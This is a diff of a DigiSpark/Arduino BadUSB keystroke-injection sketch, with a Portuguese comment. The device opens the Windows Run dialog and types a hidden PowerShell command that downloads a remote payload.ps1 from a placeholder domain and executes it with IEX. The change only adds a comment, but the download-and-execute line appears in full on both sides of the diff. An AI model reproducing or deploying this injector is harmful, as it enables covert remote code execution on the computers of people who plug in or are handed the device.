@@ -8,7 +8,7 @@ void loop() {
   DigiKeyboard.delay(800);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(900);
-  DigiKeyboardPtBr.print("powershell -WindowStyle Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://seudominio/payload.ps1')"); //
+  DigiKeyboardPtBr.print("powershell -WindowStyle Hidden \"IEX (New-Object Net.WebClient).DownloadString('https://seudominio/payload.ps1')"); // O dominio com aspas
   DigiKeyboard.delay(600);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
